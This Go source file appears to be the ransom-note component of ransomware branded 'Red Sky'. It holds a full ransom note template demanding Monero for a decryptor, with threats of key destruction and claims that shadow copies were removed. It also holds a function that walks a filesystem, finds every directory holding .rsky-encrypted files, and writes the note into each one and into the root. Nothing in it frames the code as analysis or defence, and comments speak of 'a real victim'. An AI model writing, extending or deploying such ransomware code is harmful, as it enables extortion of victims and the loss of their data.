package cryptor

import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

// NoteOptions controls a ransom-note drop.
type NoteOptions struct {
	Root         string
	Filename     string // default: READ_ME_RECOVER_FILES.txt
	ContactEmail string
	Address      string
	Price        string
	VictimID     string // auto-generated if empty
	DryRun       bool
}

// NoteResult summarises a note drop.
type NoteResult struct {
	VictimID  string
	DirCount  int
	Written   int
	RootNote  string
	DryRun    bool
}

// NoteTemplate matches the Python side byte-for-byte so a target that has
// seen one build recognizes the other.
const NoteTemplate = `!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!

Every document, photo, database, and source file on this system has
been encrypted with AES-256-GCM. The encryption key was wrapped with
RSA-4096 and only we hold the private half. Without it, recovery is
cryptographically infeasible — you cannot brute-force this.

WHAT YOU LOSE IF YOU WAIT
- The recovery key is destroyed 72 hours after the timer expires.
- Shadow copies, restore points, and Windows recovery have been removed.
- The longer you wait, the less of your data remains recoverable.

WHAT TO DO
1. Send an email to:  {{EMAIL}}
   Subject line must contain this victim ID:  {{VID}}
2. Include one encrypted file (not important) and the victim ID above.
   We will decrypt it as proof that we hold the key.
3. Payment is {{PRICE}} in Monero (XMR) to:
      {{ADDR}}
4. After payment clears, we send you the decryptor and step-by-step
   instructions.

DO NOT
- Do not try to recover files yourself. Renaming .rsky files does nothing.
- Do not run "recovery" tools. They will overwrite the encrypted data.
- Do not reinstall Windows. You will lose the encrypted copies too.

The decryptor is a small tool. Payment is not negotiable. Recovery is
guaranteed as long as you contact us before the timer expires.

- Red Sky
`

// newVictimID returns a 16-hex-char random identifier.
func newVictimID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "unknown"
	}
	return hex.EncodeToString(b)
}

// renderNote fills the placeholders in NoteTemplate.
func renderNote(email, addr, price, vid string) string {
	s := NoteTemplate
	s = strings.ReplaceAll(s, "{{EMAIL}}", email)
	s = strings.ReplaceAll(s, "{{ADDR}}", addr)
	s = strings.ReplaceAll(s, "{{PRICE}}", price)
	s = strings.ReplaceAll(s, "{{VID}}", vid)
	return s
}

// DropNote walks opts.Root, finds every directory that contains a .rsky
// file, and writes the ransom note into each. Also drops one at the root.
//
// Rationale for "dirs with .rsky" rather than "every dir": a real victim
// opens the note in the directory where they see the mangled files. If a
// directory contains no encrypted files, the note is noise.
func DropNote(opts NoteOptions) (NoteResult, error) {
	var r NoteResult
	if opts.Root == "" {
		return r, errors.New("note: root required")
	}
	if opts.ContactEmail == "" || opts.Address == "" || opts.Price == "" {
		return r, errors.New("note: contact-email, address, price required")
	}
	info, err := os.Stat(opts.Root)
	if err != nil {
		return r, fmt.Errorf("note: root stat: %w", err)
	}
	if !info.IsDir() {
		return r, errors.New("note: root must be a directory")
	}
	if opts.Filename == "" {
		opts.Filename = "READ_ME_RECOVER_FILES.txt"
	}
	if opts.VictimID == "" {
		opts.VictimID = newVictimID()
	}
	r.VictimID = opts.VictimID
	r.DryRun = opts.DryRun

	body := renderNote(opts.ContactEmail, opts.Address, opts.Price, opts.VictimID)

	// prune obvious skips while walking
	skipLow := map[string]struct{}{
		"proc": {}, "sys": {}, "dev": {}, "windows": {},
		"node_modules": {}, ".git": {}, "__pycache__": {},
	}

	hitDirs := map[string]struct{}{}
	walkErr := filepath.WalkDir(opts.Root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if d.IsDir() {
			low := strings.ToLower(d.Name())
			if _, ok := skipLow[low]; ok {
				return filepath.SkipDir
			}
			return nil
		}
		if !strings.HasSuffix(strings.ToLower(d.Name()), ".rsky") {
			return nil
		}
		dir := filepath.Dir(path)
		hitDirs[dir] = struct{}{}
		return nil
	})
	if walkErr != nil {
		return r, fmt.Errorf("note: walk: %w", walkErr)
	}

	r.DirCount = len(hitDirs)
	if opts.DryRun {
		return r, nil
	}

	for dir := range hitDirs {
		target := filepath.Join(dir, opts.Filename)
		if err := os.WriteFile(target, []byte(body), 0o644); err == nil {
			r.Written++
		}
	}
	// root note
	rootTarget := filepath.Join(opts.Root, opts.Filename)
	if err := os.WriteFile(rootTarget, []byte(body), 0o644); err == nil {
		r.RootNote = rootTarget
	}
	return r, nil
}
